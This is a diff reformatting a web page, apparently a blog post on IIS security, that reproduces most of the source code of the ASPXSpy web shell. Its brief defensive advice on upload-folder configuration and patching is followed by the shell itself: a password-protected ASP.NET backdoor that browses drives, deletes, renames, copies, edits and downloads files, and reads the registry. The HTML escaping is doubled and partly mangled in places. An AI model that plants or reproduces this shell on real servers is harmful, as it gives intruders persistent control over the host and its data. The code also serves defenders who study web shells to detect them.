@@ -65,35 +65,34 @@ TL;DR &#8211; Put a web.config file containing the following code into the uploa
     &lt;/system.web>
 &lt;/configuration></pre>
 
-To help prevent getting Trojans or having server security problems, install the latest patches/updates and check MS Technet for latest security information. You can also install and setup Urlscan from IIS Net Download Center, which may help prevent some types of attacks.
+<p>To help prevent getting Trojans or having server security problems, install the latest patches/updates and check MS Technet for latest security information. You can also install and setup Urlscan from IIS Net Download Center, which may help prevent some types of attacks.</p>
 
-If you run Microsoft Security Essentials as part of IIS Server maintenance you can detect and remove threats before they have a chance to cause problems.
+<p>If you run Microsoft Security Essentials as part of IIS Server maintenance you can detect and remove threats before they have a chance to cause problems.</p>
 
+<h3>ASPXSpy Script Source Code</h3>
 
-### ASPXSpy Script Source Code
-
-<pre class="brush: jscript; title: ; notranslate" title="">&lt;%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%&gt;
-&lt;%@ import Namespace="System.IO"%&gt;
-&lt;%@ import Namespace="System.Diagnostics"%&gt;
-&lt;%@ import Namespace="System.Data"%&gt;
-&lt;%@ import Namespace="System.Management"%&gt;
-&lt;%@ import Namespace="System.Data.OleDb"%&gt;
-&lt;%@ import Namespace="Microsoft.Win32"%&gt;
-&lt;%@ import Namespace="System.Net.Sockets" %&gt;
-&lt;%@ import Namespace="System.Net" %&gt;
-&lt;%@ import Namespace="System.Runtime.InteropServices"%&gt;
-&lt;%@ import Namespace="System.DirectoryServices"%&gt;
-&lt;%@ import Namespace="System.ServiceProcess"%&gt;
-&lt;%@ import Namespace="System.Text.RegularExpressions"%&gt;
-&lt;%@ Import Namespace="System.Threading"%&gt;
-&lt;%@ Import Namespace="System.Data.SqlClient"%&gt;
-&lt;%@ import Namespace="Microsoft.VisualBasic"%&gt;
-&lt;%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
-&lt;%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
-&lt;%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
-&lt;%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%&gt;
-&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
-&lt;script runat="server"&gt;
+<div class="highlight"><pre><code class="language-aspx-cs" data-lang="aspx-cs"><span class="ni">&amp;lt;</span>%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; trace=&quot;false&quot; validateRequest=&quot;false&quot; EnableViewStateMac=&quot;false&quot; EnableViewState=&quot;true&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.IO&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Diagnostics&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Data&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Management&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Data.OleDb&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;Microsoft.Win32&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Net.Sockets&quot; %<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Net&quot; %<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.DirectoryServices&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.ServiceProcess&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;System.Text.RegularExpressions&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Import Namespace=&quot;System.Threading&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Import Namespace=&quot;System.Data.SqlClient&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ import Namespace=&quot;Microsoft.VisualBasic&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Assembly Name=&quot;System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Assembly Name=&quot;System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Assembly Name=&quot;System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%@ Assembly Name=&quot;Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a&quot;%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>script runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
 /*
 Thanks Snailsor,FuYu,BloodSword,Cnqing,
 Code by Bin
@@ -101,8 +100,8 @@ Make in China
 Blog: http://alikaptanoglu.blogspot.com
 E-mail : ali_kaptanoglu@hotmail.com
 */
-public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
-public string vbhLn="ASPXSpy";
+public string Password=&quot;21232f297a57a5a743894a0e4a801fc3&quot;;//admin
+public string vbhLn=&quot;ASPXSpy&quot;;
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
 protected OleDbCommand Kkvb=new OleDbCommand();
@@ -121,60 +120,60 @@ return;
 }
 if(IsPostBack)
 {
-string tkI=Request["__EVENTTARGET"];
-string VqV=Request["__File"];
-if(tkI!="")
+string tkI=Request[&quot;__EVENTTARGET&quot;];
+string VqV=Request[&quot;__File&quot;];
+if(tkI!=&quot;&quot;)
 {
 switch(tkI)
 {
-case "Bin_Parent":
+case &quot;Bin_Parent&quot;:
 krIR(Ebgw(VqV));
 break;
-case "Bin_Listdir":
+case &quot;Bin_Listdir&quot;:
 krIR(Ebgw(VqV));
 break;
-case "kRXgt":
+case &quot;kRXgt&quot;:
 kRXgt(Ebgw(VqV));
 break;
-case "Bin_Createfile":
+case &quot;Bin_Createfile&quot;:
 gLKc(VqV);
 break;
-case "Bin_Editfile":
+case &quot;Bin_Editfile&quot;:
 gLKc(VqV);
 break;
-case "Bin_Createdir":
+case &quot;Bin_Createdir&quot;:
 stNPw(VqV);
 break;
-case "cYAl":
+case &quot;cYAl&quot;:
 cYAl(VqV);
 break;
-case "ksGR":
+case &quot;ksGR&quot;:
 ksGR(Ebgw(VqV));
 break;
-case "SJv":
+case &quot;SJv&quot;:
 SJv(VqV);
 break;
-case "Bin_Regread":
+case &quot;Bin_Regread&quot;:
 tpRQ(Ebgw(VqV));
 break;
-case "hae":
+case &quot;hae&quot;:
 hae();
 break;
-case "urJG":
+case &quot;urJG&quot;:
 urJG(VqV);
 break;
 }
-if(tkI.StartsWith("dAJTD"))
+if(tkI.StartsWith(&quot;dAJTD&quot;))
 {
-dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);
+dAJTD(Ebgw(tkI.Replace(&quot;dAJTD&quot;,&quot;&quot;)),VqV);
 }
-else if(tkI.StartsWith("Tlvz"))
+else if(tkI.StartsWith(&quot;Tlvz&quot;))
 {
-Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);
+Tlvz(Ebgw(tkI.Replace(&quot;Tlvz&quot;,&quot;&quot;)),VqV);
 }
-else if(tkI.StartsWith("Bin_CFile"))
+else if(tkI.StartsWith(&quot;Bin_CFile&quot;))
 {
-YByN(Ebgw(tkI.Replace("Bin_CFile","")),VqV);
+YByN(Ebgw(tkI.Replace(&quot;Bin_CFile&quot;,&quot;&quot;)),VqV);
 }
 }
 }
@@ -218,16 +217,16 @@ public void PBZw()
 {
 ZVS.Visible=true;
 ljtzC.Visible=false;
-Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
-Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
-Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};";
-Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
-Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
+Bin_Button_CreateFile.Attributes[&quot;onClick&quot;]=&quot;var filename=prompt(&#39;Please input the file name:&#39;,&#39;&#39;);if(filename){Bin_PostBack(&#39;Bin_Createfile&#39;,filename);}&quot;;
+Bin_Button_CreateDir.Attributes[&quot;onClick&quot;]=&quot;var filename=prompt(&#39;Please input the directory name:&#39;,&#39;&#39;);if(filename){Bin_PostBack(&#39;Bin_Createdir&#39;,filename);}&quot;;
+Bin_Button_KillMe.Attributes[&quot;onClick&quot;]=&quot;if(confirm(&#39;Are you sure delete ASPXSPY?&#39;)){Bin_PostBack(&#39;hae&#39;,&#39;&#39;);};&quot;;
+Bin_Span_Sname.InnerHtml=Request.ServerVariables[&quot;LOCAL_ADDR&quot;]+&quot;:&quot;+Request.ServerVariables[&quot;SERVER_PORT&quot;]+&quot;(&quot;+Request.ServerVariables[&quot;SERVER_NAME&quot;]+&quot;)&quot;;
+Bin_Span_FrameVersion.InnerHtml=&quot;Framework Ver : &quot;+Environment.Version.ToString();
 if (AXSbb.Value==string.Empty)
 {
-AXSbb.Value=OElM(Server.MapPath("."));
+AXSbb.Value=OElM(Server.MapPath(&quot;.&quot;));
 }
-Bin_H2_Title.InnerText="File Manager &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;File Manager <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 krIR(AXSbb.Value);
 }
 public void fhAEn()
@@ -235,33 +234,33 @@ public void fhAEn()
 try
 {
 string[] YRgt=Directory.GetLogicalDrives();
-for(int i=0;i&lt;YRgt.Length;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>YRgt.Length;i++)
 {
-Control c=ParseControl(" &lt;asp:LinkButton Text='"+mFvj(YRgt[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+YRgt[i]+"'/&gt; | ");
+Control c=ParseControl(&quot; <span class="ni">&amp;lt;</span>asp:LinkButton Text=&#39;&quot;+mFvj(YRgt[i])+&quot;&#39; ID=\&quot;Bin_Button_Driv&quot;+i+&quot;\&quot; runat=&#39;server&#39; commandargument= &#39;&quot;+YRgt[i]+&quot;&#39;/<span class="ni">&amp;gt;</span> | &quot;);
 Bin_Span_Drv.Controls.Add(c);
-LinkButton nxeDR=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
+LinkButton nxeDR=(LinkButton)Page.FindControl(&quot;Bin_Button_Driv&quot;+i);
 nxeDR.Command+=new CommandEventHandler(this.iVk);
 }
 }catch(Exception ex){}
 }
 public string OElM(string path)
 {
-if(path.Substring(path.Length-1,1)!=@"\")
+if(path.Substring(path.Length-1,1)!=@&quot;\&quot;)
 {
-path=path+@"\";
+path=path+@&quot;\&quot;;
 }
 return path;
 }
 public string nrrx(string path)
 {
-char[] trim={'\\'};
-if(path.Substring(path.Length-1,1)==@"\")
+char[] trim={&#39;\\&#39;};
+if(path.Substring(path.Length-1,1)==@&quot;\&quot;)
 {
 path=path.TrimEnd(trim);
 }
 return path;
 }
-[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
+[DllImport(&quot;kernel32.dll&quot;,EntryPoint=&quot;GetDriveTypeA&quot;)]
 public static extern int OMZP(string nDrive);
 public string mFvj(string instr)
 {
@@ -270,25 +269,25 @@ int num=OMZP(instr);
 switch(num)
 {
 case 1:
-EuXD="Unknow("+instr+")";
+EuXD=&quot;Unknow(&quot;+instr+&quot;)&quot;;
 break;
 case 2:
-EuXD="Removable("+instr+")";
+EuXD=&quot;Removable(&quot;+instr+&quot;)&quot;;
 break;
 case 3:
-EuXD="Fixed("+instr+")";
+EuXD=&quot;Fixed(&quot;+instr+&quot;)&quot;;
 break;
 case 4:
-EuXD="Network("+instr+")";
+EuXD=&quot;Network(&quot;+instr+&quot;)&quot;;
 break;
 case 5:
-EuXD="CDRom("+instr+")";
+EuXD=&quot;CDRom(&quot;+instr+&quot;)&quot;;
 break;
 case 6:
-EuXD="RAM Disk("+instr+")";
+EuXD=&quot;RAM Disk(&quot;+instr+&quot;)&quot;;
 break;
 }
-return EuXD.Replace(@"\","");
+return EuXD.Replace(@&quot;\&quot;,&quot;&quot;);
 }
 public string MVVJ(string instr)
 {
@@ -304,25 +303,25 @@ public void krIR(string path)
 {
 WICxe();
 CzfO.Visible=true;
-Bin_H2_Title.InnerText="File Manager &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;File Manager <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 AXSbb.Value=OElM(path);
 DirectoryInfo GQMM=new DirectoryInfo(path);
 if(Directory.GetParent(nrrx(path))!=null)
 {
 string bg=OKM();
 TableRow p=new TableRow();
-for(int i=1;i&lt;6;i++)
+for(int i=1;i<span class="ni">&amp;lt;</span>6;i++)
 {
 TableCell pc=new TableCell();
 if(i==1)
 {
-pc.Width=Unit.Parse("2%");
-pc.Text="0";
+pc.Width=Unit.Parse(&quot;2%&quot;);
+pc.Text=&quot;0&quot;;
 p.CssClass=bg;
 }
 if(i==2)
 {
-pc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\"&gt;Parent Directory&lt;/a&gt;";
+pc.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Parent&#39;,&#39;&quot;+MVVJ(Directory.GetParent(nrrx(path)).ToString())+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Parent Directory<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 }
 p.Cells.Add(pc);
 UGzP.Rows.Add(p);
@@ -337,34 +336,34 @@ string bg=OKM();
 vLlH++;
 TableRow tr=new TableRow();
 TableCell tc=new TableCell();
-tc.Width=Unit.Parse("2%");
-tc.Text="0";
-tr.Attributes["onmouseover"]="this.className='focus';";
+tc.Width=Unit.Parse(&quot;2%&quot;);
+tc.Text=&quot;0&quot;;
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
 tr.Cells.Add(tc);
 TableCell HczyN=new TableCell();
-HczyN.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')\"&gt;"+Bin_folder.Name+"&lt;/a&gt;";
+HczyN.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Listdir&#39;,&#39;&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+Bin_folder.Name+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(HczyN);
 TableCell LYZK=new TableCell();
-LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;);
 tr.Cells.Add(LYZK);
 UGzP.Rows.Add(tr);
 TableCell ERUL=new TableCell();
-ERUL.Text="--";
+ERUL.Text=&quot;--&quot;;
 tr.Cells.Add(ERUL);
 UGzP.Rows.Add(tr);
 TableCell ZGKh=new TableCell();
-ZGKh.Text="&lt;a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\"&gt;Del&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \"&gt;Rename&lt;/a&gt;";
+ZGKh.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:if(confirm(&#39;Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.&#39;)){Bin_PostBack(&#39;kRXgt&#39;,&#39;&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#39;)};\&quot;<span class="ni">&amp;gt;</span>Del<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=&#39;#&#39; onclick=\&quot;var filename=prompt(&#39;Please input the new folder name:&#39;,&#39;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_folder.Name.Replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;)+&quot;&#39;);if(filename){Bin_PostBack(&#39;dAJTD&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#39;,filename);} \&quot;<span class="ni">&amp;gt;</span>Rename<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(ZGKh);
 UGzP.Rows.Add(tr);
 }
 TableRow cKVA=new TableRow();
-cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
-cKVA.Attributes["bgcolor"]="#dddddd";
+cKVA.Attributes[&quot;style&quot;]=&quot;border-top:1px solid #fff;border-bottom:1px solid #ddd;&quot;;
+cKVA.Attributes[&quot;bgcolor&quot;]=&quot;#dddddd&quot;;
 TableCell JlmW=new TableCell();
-JlmW.Attributes["colspan"]="6" ;
-JlmW.Attributes["height"]="5";
+JlmW.Attributes[&quot;colspan&quot;]=&quot;6&quot; ;
+JlmW.Attributes[&quot;height&quot;]=&quot;5&quot;;
 cKVA.Cells.Add(JlmW);
 UGzP.Rows.Add(cKVA);
 int aYRwo=0;
@@ -374,28 +373,28 @@ aYRwo++;
 string gb=OKM();
 TableRow tr=new TableRow();
 TableCell tc=new TableCell();
-tc.Width=Unit.Parse("2%");
-tc.Text="&lt;input type=\"checkbox\" value=\"0\" name=\""+MVVJ(Bin_Files.Name)+"\"&gt;";
-tr.Attributes["onmouseover"]="this.className='focus';";
+tc.Width=Unit.Parse(&quot;2%&quot;);
+tc.Text=&quot;<span class="ni">&amp;lt;</span>input type=\&quot;checkbox\&quot; value=\&quot;0\&quot; name=\&quot;&quot;+MVVJ(Bin_Files.Name)+&quot;\&quot;<span class="ni">&amp;gt;</span>&quot;;
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=gb;
-tr.Attributes["onmouseout"]="this.className='"+gb+"';";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+gb+&quot;&#39;;&quot;;
 tr.Cells.Add(tc);
 TableCell filename=new TableCell();
 if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
 {
 string url=Request.Url.ToString();
-filename.Text="&lt;a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\"&gt;"+Bin_Files.Name+"&lt;/a&gt;";
+filename.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;&quot;+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf(&#39;/&#39;,8)+1)).Replace(&quot;\\&quot;,&quot;/&quot;)+&quot;\&quot; target=\&quot;_blank\&quot;<span class="ni">&amp;gt;</span>&quot;+Bin_Files.Name+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 }
 else
 {
 filename.Text=Bin_Files.Name;
 }
 TableCell albt=new TableCell();
-albt.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+albt.Text=Bin_Files.LastWriteTimeUtc.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;);
 TableCell YzK=new TableCell();
 YzK.Text=mTG(Bin_Files.Length);
 TableCell GLpi=new TableCell();
-GLpi.Text="&lt;a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\"&gt;Down&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;Copy&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\"&gt;Edit&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;Rename&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\"&gt;Time&lt;/a&gt; ";
+GLpi.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#39;ksGR&#39;,&#39;&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Down<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=&#39;#&#39; onclick=\&quot;var filename=prompt(&#39;Please input the new path(full path):&#39;,&#39;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_Files.Name.Replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;)+&quot;&#39;);if(filename){Bin_PostBack(&#39;Bin_CFile&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#39;,filename);} \&quot;<span class="ni">&amp;gt;</span>Copy<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#39;Bin_Editfile&#39;,&#39;&quot;+Bin_Files.Name+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Edit<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=&#39;#&#39; onclick=\&quot;var filename=prompt(&#39;Please input the new file name(full path):&#39;,&#39;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_Files.Name.Replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;)+&quot;&#39;);if(filename){Bin_PostBack(&#39;Tlvz&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#39;,filename);} \&quot;<span class="ni">&amp;gt;</span>Rename<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#39;cYAl&#39;,&#39;&quot;+Bin_Files.Name+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Time<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> &quot;;
 tr.Cells.Add(filename);
 tr.Cells.Add(albt);
 tr.Cells.Add(YzK);
@@ -405,22 +404,22 @@ UGzP.Rows.Add(tr);
 string lgb=OKM();
 TableRow oWam=new TableRow();
 oWam.CssClass=lgb;
-for(int i=1;i&lt;4;i++)
+for(int i=1;i<span class="ni">&amp;lt;</span>4;i++)
 {
 TableCell lGV=new TableCell();
 if(i==1)
 {
-lGV.Text="&lt;input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/&gt;";
+lGV.Text=&quot;<span class="ni">&amp;lt;</span>input name=\&quot;chkall\&quot; value=\&quot;on\&quot; type=\&quot;checkbox\&quot; onclick=\&quot;var ck=document.getElementsByTagName(&#39;input&#39;);for(var i=0;i<span class="ni">&amp;lt;</span>ck.length-1;i++){if(ck[i].type==&#39;checkbox&#39;<span class="ni">&amp;&amp;ck[i].name!=&#39;chkall&#39;){ck[i].checked=forms[0].chkall.checked;</span>}}\&quot;/<span class="ni">&amp;gt;</span>&quot;;
 }
 if(i==2)
 {
-lGV.Text="&lt;a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\"&gt;Delete selected&lt;/a&gt;";
+lGV.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;#\&quot; Onclick=\&quot;var d_file=&#39;&#39;;var ck=document.getElementsByTagName(&#39;input&#39;);for(var i=0;i<span class="ni">&amp;lt;</span>ck.length-1;i++){if(ck[i].checked<span class="ni">&amp;&amp;ck[i].name!=&#39;chkall&#39;){d_file+=ck[i].name+&#39;,&#39;;</span>}};if(d_file==null || d_file==&#39;&#39;){ return;} else {if(confirm(&#39;Are you sure delete the files ?&#39;)){Bin_PostBack(&#39;SJv&#39;,d_file)};}\&quot;<span class="ni">&amp;gt;</span>Delete selected<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 }
 if(i==3)
 {
 lGV.ColumnSpan=4;
-lGV.Style.Add("text-align","right");
-lGV.Text=vLlH+" directories/ "+aYRwo+" files";
+lGV.Style.Add(&quot;text-align&quot;,&quot;right&quot;);
+lGV.Text=vLlH+&quot; directories/ &quot;+aYRwo+&quot; files&quot;;
 }
 oWam.Cells.Add(lGV);
 }
@@ -436,11 +435,11 @@ public string OKM()
 TdgGU++;
 if(TdgGU % 2==0)
 {
-return "alt1";
+return &quot;alt1&quot;;
 }
 else
 {
-return "alt2";
+return &quot;alt2&quot;;
 }
 }
 public void kRXgt(string qcKu)
@@ -448,7 +447,7 @@ public void kRXgt(string qcKu)
 try
 {
 Directory.Delete(qcKu,true);
-xseuB("Directory delete new success !");
+xseuB(&quot;Directory delete new success !&quot;);
 }
 catch(Exception error)
 {
@@ -461,7 +460,7 @@ public void dAJTD(string sdir,string ddir)
 try
 {
 Directory.Move(sdir,ddir);
-xseuB("Directory Renamed Success !");
+xseuB(&quot;Directory Renamed Success !&quot;);
 }
 catch(Exception error)
 {
@@ -474,7 +473,7 @@ public void Tlvz(string sfile,string dfile)
 try
 {
 File.Move(sfile,dfile);
-xseuB("File Renamed Success !");
+xseuB(&quot;File Renamed Success !&quot;);
 }
 catch(Exception error)
 {
@@ -487,7 +486,7 @@ public void YByN(string spath,string dpath)
 try
 {
 File.Copy(spath,dpath);
-xseuB("File Copy Success !");
+xseuB(&quot;File Copy Success !&quot;);
 }
 catch(Exception error)
 {
@@ -500,7 +499,7 @@ public void stNPw(string path)
 try
 {
 Directory.CreateDirectory(AXSbb.Value+path);
-xseuB("Directory created success !");
+xseuB(&quot;Directory created success !&quot;);
 }
 catch(Exception error)
 {
@@ -510,7 +509,7 @@ krIR(AXSbb.Value);
 }
 public void gLKc(string path)
 {
-if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
+if(Request[&quot;__EVENTTARGET&quot;]==&quot;Bin_Editfile&quot; || Request[&quot;__EVENTTARGET&quot;]==&quot;Bin_Createfile&quot;)
 {
 foreach(ListItem item in NdCX.Items)
 {
@@ -520,10 +519,10 @@ item.Selected=false;
 }
 }
 }
-Bin_H2_Title.InnerHtml="Create/ Edit File &gt;&gt;";
+Bin_H2_Title.InnerHtml=&quot;Create/ Edit File <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 vrFA.Visible=true;
-if(path.IndexOf(":")&lt; 0)
+if(path.IndexOf(&quot;:&quot;)<span class="ni">&amp;lt;</span> 0)
 {
 Sqon.Value=AXSbb.Value+path;
 }
@@ -534,7 +533,7 @@ Sqon.Value=path;
